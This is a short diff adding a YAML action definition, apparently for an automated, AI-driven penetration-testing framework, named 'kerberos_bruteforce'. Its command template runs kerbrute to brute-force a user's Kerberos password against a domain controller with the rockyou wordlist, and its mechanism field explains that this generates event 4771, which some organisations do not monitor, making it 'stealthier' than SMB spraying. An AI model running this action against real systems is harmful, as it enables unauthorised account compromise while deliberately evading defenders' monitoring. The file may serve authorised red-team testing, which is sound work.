@@ -1,0 +1,16 @@
+name: kerberos_bruteforce
+category: services
+description: Kerberos brute-force without lockout
+preconditions:
+  - service.port==88
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "kerbrute bruteuser --dc {target_ip} -d {domain} /usr/share/wordlists/rockyou.txt {username}"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Kerberos pre-auth brute-force generates event 4771 (not 4625). Some orgs don't monitor 4771. Slower than SMB spray but stealthier."
